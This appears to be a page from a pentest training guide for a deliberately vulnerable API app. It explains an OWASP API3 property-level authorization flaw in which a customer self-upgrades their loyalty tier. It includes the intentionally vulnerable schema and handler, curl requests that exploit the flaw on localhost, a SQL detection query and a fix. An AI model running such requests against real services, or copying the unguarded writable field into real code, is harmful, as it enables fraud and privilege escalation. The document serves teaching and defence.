# API3 — Broken Object Property Level Authorization · VulnMNO Pentest Guide

> **Status: live — implemented and verified.** The exploitation steps below
> were run against a live instance and the outputs shown are real.

OWASP API Security reference: **API3:2023 — Broken Object Property Level
Authorization** (a business-controlled property exposed for the caller to
write, with no authorization check gating it).

## Where it lives

- **Endpoint:** `PUT /api/customers/me/contact-details`
- **Schema:** `app/schemas/customer.py::ContactDetailsUpdate`
- **Code:** `app/routers/customers.py::update_contact_details`

```python
class ContactDetailsUpdate(ApiModel):
    email: str | None = None
    billingAddress: Address | None = None
    notificationPreferences: "NotificationPreferencesUpdate | None" = None
    loyaltyTier: Literal["bronze", "silver", "gold", "platinum"] | None = None
```

```python
if body.loyaltyTier is not None:
    customer.loyalty_tier = body.loyaltyTier
```

## Why it is API3

`loyaltyTier` is a business-controlled property — it drives real discount
eligibility elsewhere (`services/shop.py::resolve_promo`'s `min_loyalty_tier`
rule, `LOYALTY_RANK`) and is meant to be earned through the loyalty engine
(`services/loyalty.py::accrue_for_purchase`), not self-declared. It was wired
into the same "update my contact details" write path as harmless preferences
(email, billing address, notification settings) with **no authorization
check** distinguishing "properties this customer may change about themselves"
from "properties only the loyalty engine should change." That's the API3
pattern precisely: object-level authorization (is this *my own* customer
record?) is fine here — the gap is at the *property* level.

## How to find it (static analysis)

```bash
grep -n "loyaltyTier" src/backend/app/schemas/customer.py src/backend/app/routers/customers.py
```

A field that also appears in `CustomerRead` (read-only display) showing up
as a plain, unguarded writable field on an `*Update` schema is the pattern
to look for — compare against fields like `status`/`accountType`, which
correctly have **no** update path anywhere in `customers.py`.

## Verified exploitation (actual run)

```bash
# Before
curl -s http://localhost:8000/api/customers/me -H "Authorization: Bearer $TOKEN" \
  | grep -o '"loyaltyTier":"[^"]*"'
# -> "loyaltyTier":"bronze"

# Exploit
curl -s -X PUT http://localhost:8000/api/customers/me/contact-details \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"loyaltyTier":"platinum"}'
```

Actual response:

```json
{"customerId":"CUST-10003","name":"Clara Núñez","email":"clara@example.test",
 "primaryMsisdn":"+34600000003","accountType":"hybrid","status":"active",
 "loyaltyTier":"platinum","billingAddress":null,
 "notificationPreferences":{"push":true,"sms":true,"email":true,"inApp":true}}
```

```bash
# After — confirmed persisted, not just echoed back
curl -s http://localhost:8000/api/customers/me -H "Authorization: Bearer $TOKEN" \
  | grep -o '"loyaltyTier":"[^"]*"'
# -> "loyaltyTier":"platinum"
```

`bronze → platinum` in one unauthenticated-for-this-purpose self-service
call — no purchases, no loyalty accrual, no admin action.

## Blue-team detection

```sql
-- Loyalty tier changes with no corresponding loyalty_transactions row
-- (a legitimate tier-up always accrues through the loyalty engine)
SELECT c.public_id, c.loyalty_tier
FROM customers c
LEFT JOIN loyalty_transactions lt ON lt.customer_id = c.id
WHERE c.loyalty_tier = 'platinum' AND lt.id IS NULL;
```

## Remediation diff

```diff
-    if body.loyaltyTier is not None:
-        customer.loyalty_tier = body.loyaltyTier
```

Drop the field (and the schema entry) entirely — loyalty tier should only
ever change through `services/loyalty.py::accrue_for_purchase` or an
explicit admin action, never through the customer's own contact-details
write path.
